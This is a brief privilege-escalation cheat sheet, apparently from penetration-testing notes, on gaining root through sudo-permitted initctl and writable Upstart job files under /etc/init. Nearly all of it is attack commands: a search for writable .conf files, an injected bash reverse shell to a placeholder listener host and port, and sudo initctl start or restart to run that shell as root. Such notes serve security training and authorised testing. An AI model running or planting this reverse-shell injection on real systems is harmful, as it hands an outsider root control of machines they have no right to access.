# initctl Upstart Job sudo SYSTEM

If `sudo -l` shows `initctl` allowed and you can write to `/etc/init/*.conf` (via group membership), inject a command into the `script` block and start/restart the service.

```bash
# Check writable conf files
find /etc/init -writable -name "*.conf" 2>/dev/null
# or: find / -type f -group developers 2>/dev/null | grep /etc/init

# Inject into test.conf script block
vi /etc/init/test.conf
# Add before exec line:
# exec bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'

# Start/restart the job
sudo initctl start test
# or: sudo initctl restart test
```

Runs as root (Upstart jobs run as root by default).
